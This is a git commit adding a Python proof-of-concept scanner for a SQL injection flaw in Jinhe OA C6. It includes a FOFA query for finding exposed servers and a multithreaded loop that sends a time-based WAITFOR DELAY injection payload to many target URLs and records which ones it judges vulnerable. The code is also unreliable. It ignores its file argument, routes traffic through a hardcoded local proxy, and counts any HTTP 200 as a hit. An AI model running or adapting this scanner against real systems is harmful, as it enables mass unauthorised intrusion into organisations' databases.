c605a14ad1dff25ea557ff1296f3a479b851c5b8
zz1admin <2843950434@qq.com>
2024-07-28 13:00:07 +0800

    Add files via upload

---
+++ 金和OA C6-GetSgIData.aspx SQL注入漏洞.py
@@ -0,0 +1,64 @@
+#金和OA C6-GetSgIData.aspx SQL注入漏洞
+#fofa:app="金和网络-金和OA" && body="/c6/"
+
+import requests,sys,argparse,json,re
+from multiprocessing.dummy import Pool
+# 关闭警告
+requests.packages.urllib3.disable_warnings()
+
+def banner():
+    test ="""
+
+ ██████╗ ██████╗        ██████╗ ███████╗████████╗███████╗ ██████╗ ██╗██████╗  █████╗ ████████╗ █████╗     █████╗ ███████╗██████╗ ██╗  ██╗        ███████╗ ██████╗ ██╗     
+██╔════╝██╔════╝       ██╔════╝ ██╔════╝╚══██╔══╝██╔════╝██╔════╝ ██║██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗   ██╔══██╗██╔════╝██╔══██╗╚██╗██╔╝        ██╔════╝██╔═══██╗██║     
+██║     ███████╗ █████╗██║  ███╗█████╗     ██║   ███████╗██║  ███╗██║██║  ██║███████║   ██║   ███████║   ███████║███████╗██████╔╝ ╚███╔╝         ███████╗██║   ██║██║     
+██║     ██╔═══██╗╚════╝██║   ██║██╔══╝     ██║   ╚════██║██║   ██║██║██║  ██║██╔══██║   ██║   ██╔══██║   ██╔══██║╚════██║██╔═══╝  ██╔██╗         ╚════██║██║▄▄ ██║██║     
+╚██████╗╚██████╔╝      ╚██████╔╝███████╗   ██║   ███████║╚██████╔╝██║██████╔╝██║  ██║   ██║   ██║  ██║██╗██║  ██║███████║██║     ██╔╝ ██╗███████╗███████║╚██████╔╝███████╗
+ ╚═════╝ ╚═════╝        ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝ ╚══▀▀═╝ ╚══════╝                                                                                                                                                                          
+                                                                                                                                                                                      
+"""
+    print(test)
+def main():
+    banner()
+    parse = argparse.ArgumentParser(description="金和OA C6-GetSgIData.aspx SQL注入漏洞")
+    parse.add_argument('-u','--url',dest='url',type=str,help="please input you url")
+    parse.add_argument('-f','--file',dest='file',type=str,help="please input you file")
+    args = parse.parse_args()
+    if args.url and not args.file:
+        poc(args.url)
+
+    elif args.file and not args.url:
+        url_list = []
+        with open('1.txt','r',encoding='utf-8') as fp:
+            for url in fp.readlines():
+                url_list.append(url.strip())
+        mp = Pool(100)
+        mp.map(poc,url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 
+
+def poc(target):
+    payload = "/C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1%3bWAITFOR+DELAY+'0%3a0%3a5'+--%20and%201=1"
+    proxies ={
+        'http':'http://127.0.0.1:8080',
+        'https':'http://127.0.0.1:8080'
+    } 
+    try:
+        res1 = requests.post(url=target+payload,verify=False,proxies=proxies)
+        if res1.status_code==200:
+            print(f'[+]{target}存在漏洞')
+            with open('result.txt','a',encoding='utf-8') as fp1:
+                fp1.write(target+'\n')
+        else:
+            print(f'[-]{target}不存在漏洞')
+    except requests.RequestException as e:
+        print(f"[-] 请求失败: {target}, 错误信息: {e}")
+    except json.JSONDecodeError:
+        print(f"[-] 无法解码JSON响应: {target}")
+    except Exception as e:
+        print(f"[-] 处理请求时出错: {target}, 错误信息: {e}")    
+
+if __name__ == "__main__":
+    main()
